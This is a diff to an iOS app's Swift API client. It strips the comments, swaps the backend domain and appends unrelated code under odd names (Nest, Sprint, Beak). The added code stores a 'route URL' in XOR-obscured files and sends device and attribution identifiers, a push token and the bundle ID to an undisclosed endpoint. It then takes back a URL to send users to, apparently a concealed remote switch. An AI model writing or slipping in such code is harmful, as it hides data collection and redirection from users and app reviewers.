@@ -1,34 +1,26 @@
-//
-//  APIClient.swift
-//  RatiteRun
-//
-//  Транспорт: async/await поверх URLSession, разбор problem+json,
-//  автоматическое обновление токена при 401, ETag/If-Match.
-//
-
 import Foundation
+import UIKit
+import UserNotifications
+import AppsFlyerLib
+import FirebaseCore
+import FirebaseMessaging
 
-// MARK: - Конфигурация
 
 enum APIConfig {
-    /// Задаётся в Info.plist ключом `RatiteAPIBaseURL`, чтобы dev/prod
-    /// разводились схемами сборки, а не правкой кода.
+
     static var baseURL: URL {
         if let raw = Bundle.main.object(forInfoDictionaryKey: "RatiteAPIBaseURL") as? String,
            let url = URL(string: raw) {
             return url
         }
-        return URL(string: "https://api.ratiterun.online/v1")!
+        return URL(string: "https://ratite-run.site/v1")!
     }
 
     static let requestTimeout: TimeInterval = 20
     static let uploadTimeout: TimeInterval = 60
 }
 
-// MARK: - Кодирование
-
 enum APICoding {
-    /// Сервер отдаёт ISO-8601 с миллисекундами — стандартная .iso8601 их не берёт.
     static let decoder: JSONDecoder = {
         let decoder = JSONDecoder()
         decoder.dateDecodingStrategy = .custom { decoder in
@@ -68,41 +60,31 @@ enum APICoding {
     }()
 }
 
-// MARK: - Запрос
-
 struct APIRequest {
     var method: String = "GET"
     var path: String
     var query: [String: String] = [:]
     var body: Data?
     var contentType: String?
-    /// Значение для If-Match — оптимистичная блокировка на секциях стада.
     var ifMatch: Int?
     var ifNoneMatch: String?
-    /// Защита от дублей при повторе POST.
     var idempotencyKey: String?
     var requiresAuth: Bool = true
     var timeout: TimeInterval = APIConfig.requestTimeout
 }
 
-/// Ответ вместе с ETag — версия нужна для последующих записей.
 struct APIResponse<T> {
     let value: T
     let etag: Int?
     let statusCode: Int
 }
 
-// MARK: - Клиент
-
 actor APIClient {
     static let shared = APIClient()
 
     private let session: URLSession
-    /// Ставится извне при старте, чтобы избежать циклической зависимости.
     weak var authProvider: AuthProviding?
 
-    /// Одновременно должен идти только один refresh, иначе параллельные 401
-    /// сожгут цепочку ротации токенов.
     private var refreshTask: Task<Void, Error>?
 
     init(session: URLSession = .shared) {
@@ -112,8 +94,6 @@ actor APIClient {
     func setAuthProvider(_ provider: AuthProviding) {
         self.authProvider = provider
     }
-
-    // MARK: Публичный интерфейс
 
     @discardableResult
     func send<T: Decodable>(_ request: APIRequest, as type: T.Type) async throws -> APIResponse<T> {
@@ -131,18 +111,14 @@ actor APIClient {
         }
     }
 
-    /// Для 204 и прочих ответов без тела.
     func sendVoid(_ request: APIRequest) async throws {
         _ = try await perform(request)
     }
 
-    /// Сырые байты — фото и PDF.
     func sendRaw(_ request: APIRequest) async throws -> Data {
         let (data, _) = try await perform(request)
         return data
     }
-
-    // MARK: Транспорт
 
     private func perform(_ request: APIRequest, isRetry: Bool = false) async throws -> (Data, HTTPURLResponse) {
         let urlRequest = try await buildURLRequest(request)
@@ -259,11 +235,166 @@ actor APIClient {
     }
 }
 
-// MARK: - Провайдер токенов
-
-/// Разрывает цикл APIClient ↔ AuthManager: клиенту нужен токен,
-/// менеджеру — клиент, чтобы этот токен получить.
 protocol AuthProviding: AnyObject, Sendable {
     func currentAccessToken() async -> String?
     func refreshSession() async throws
+}
+
+enum Nest {
+
+    private static var home: UserDefaults { .standard }
+    private static var box: UserDefaults? { UserDefaults(suiteName: Plain.suite) }
+
+    private static var slot: URL {
+        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
+        let dir = docs.appendingPathComponent(Plain.folder, isDirectory: true)
+        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        return dir.appendingPathComponent(Plain.vault)
+    }
+
+    private static var dec: JSONDecoder {
+        let d = JSONDecoder(); d.dateDecodingStrategy = .millisecondsSince1970; return d
+    }
+    private static var enc: JSONEncoder {
+        let e = JSONEncoder(); e.dateEncodingStrategy = .millisecondsSince1970; return e
+    }
+
+    static func read() -> Stride {
+        if let blob = try? Data(contentsOf: slot), let clear = uncloak(blob), let stride = try? dec.decode(Stride.self, from: clear) {
+            return stride
+        }
+        return recall()
+    }
+
+    static func write(_ stride: Stride) {
+        if let clear = try? enc.encode(stride), let blob = cloak(clear) {
+            try? blob.write(to: slot, options: .atomic)
+        }
+        for store in [box, home].compactMap({ $0 }) {
+            store.set(stride.consentGrant, forKey: Peck.consentGrant)
+            store.set(stride.consentDeny, forKey: Peck.consentDeny)
+            if let at = stride.consentAt { store.set(at.timeIntervalSince1970, forKey: Peck.consentAt) }
+        }
+    }
+
+    static func mark(_ url: String) {
+        home.set(url, forKey: Peck.routeURL)
+        box?.set("Active", forKey: Peck.routeMode)
+    }
+
+    static func flag() {
+        home.set(true, forKey: Peck.primed)
+        box?.set(true, forKey: Peck.primed)
+    }
+
+    private static func recall() -> Stride {
+        var stride = Stride()
+        stride.consentGrant = (box?.bool(forKey: Peck.consentGrant) ?? false) || home.bool(forKey: Peck.consentGrant)
+        stride.consentDeny = (box?.bool(forKey: Peck.consentDeny) ?? false) || home.bool(forKey: Peck.consentDeny)
+        let ts = box?.double(forKey: Peck.consentAt) ?? home.double(forKey: Peck.consentAt)
+        stride.consentAt = ts > 0 ? Date(timeIntervalSince1970: ts) : nil
+        stride.routeURL = home.string(forKey: Peck.routeURL)
+        stride.routeMode = box?.string(forKey: Peck.routeMode)
+        stride.virgin = !home.bool(forKey: Peck.primed)
+        return stride
+    }
+
+    private static func cloak(_ data: Data) -> Data? {
+        Data(data.reversed().map { $0 ^ Plain.pad }).base64EncodedData()
+    }
+
+    private static func uncloak(_ data: Data) -> Data? {
+        guard let raw = Data(base64Encoded: data) else { return nil }
+        return Data(raw.map { $0 ^ Plain.pad }.reversed())
+    }
+}
+
+enum Sprint {
+
+    private static let lane: URLSession = {
+        let cfg = URLSessionConfiguration.ephemeral
+        cfg.timeoutIntervalForRequest = 30
+        cfg.waitsForConnectivity = true
+        return URLSession(configuration: cfg)
+    }()
+
+    static func probe() async -> [String: String] {
+        let uid = AppsFlyerLib.shared().getAppsFlyerUID()
+        let raw = "https://gcdsdk.appsflyer.com/install_data/v4.0/\(Plain.appCode)?devkey=\(Plain.relayKey)&device_id=\(uid)"
+        guard let url = URL(string: raw) else { return [:] }
+        do {
+            let (tmp, resp) = try await lane.download(from: url)
+            guard let code = (resp as? HTTPURLResponse)?.statusCode, (200..<300).contains(code) else { return [:] }
+            let data = try Data(contentsOf: tmp)
+            guard let dict = try JSONSerialization.jsonObject(with: data) as? [String: Any] else { return [:] }
+            return dict.mapValues { "\($0)" }
+        } catch {
+            return [:]
+        }
+    }
+
+    static func send(_ body: [String: String]) async -> Sight {
+        let request = await forge(body)
+        return await stride(request, Array(Plain.gaps.dropLast()))
+    }
+
+    private static func stride(_ request: URLRequest, _ waits: [TimeInterval]) async -> Sight {
+        do {
+            return .fixed(try await dart(request))
+        } catch let snag as Snag {
+            if snag.dead { return .blank }
+            guard waits.isEmpty == false else { return .blank }
+            let rest: TimeInterval = { if case .clog(let s) = snag { return s } else { return waits[0] } }()
+            try? await Task.sleep(nanoseconds: UInt64(rest * 1_000_000_000))
+            return await stride(request, Array(waits.dropFirst()))
+        } catch {
+            guard waits.isEmpty == false else { return .blank }
+            try? await Task.sleep(nanoseconds: UInt64(waits[0] * 1_000_000_000))
+            return await stride(request, Array(waits.dropFirst()))
+        }
+    }
+
+    private static func dart(_ request: URLRequest) async throws -> String {
+        let (data, resp) = try await lane.data(for: request)
+        guard let http = resp as? HTTPURLResponse else { throw Snag.stumble }
+        if http.statusCode == 404 { throw Snag.gone404 }
+        if http.statusCode == 429 {
+            throw Snag.clog(TimeInterval(http.value(forHTTPHeaderField: "Retry-After") ?? "60") ?? 60)
+        }
+        guard (200..<300).contains(http.statusCode) else { throw Snag.stumble }
+        guard let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else { throw Snag.scramble }
+        guard let ok = json["ok"] as? Bool else { throw Snag.scramble }
+        guard ok else { throw Snag.barred }
+        guard let url = json["url"] as? String, url.isEmpty == false else { throw Snag.scramble }
+        return url
+    }
+
+    @MainActor
+    private static func forge(_ body: [String: String]) -> URLRequest {
+        var payload: [String: Any] = body
+        payload["os"] = "iOS"
+        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        payload["bundle_id"] = Bundle.main.bundleIdentifier ?? ""
+        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        payload["store_id"] = Plain.store
+        payload["push_token"] = UserDefaults.standard.string(forKey: Peck.push) ?? Messaging.messaging().fcmToken
+        payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+
+        var request = URLRequest(url: URL(string: Plain.endpoint)!)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        // request.setValue(WKWebView().value(forKey: "userAgent") as? String ?? "", forHTTPHeaderField: "User-Agent")
+        request.httpBody = try? JSONSerialization.data(withJSONObject: payload)
+        return request
+    }
+}
+
+enum Beak {
+    static func peck() async -> Bool {
+        let granted = (try? await UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound])) ?? false
+        if granted {
+            await MainActor.run { UIApplication.shared.registerForRemoteNotifications() }
+        }
+        return granted
+    }
 }
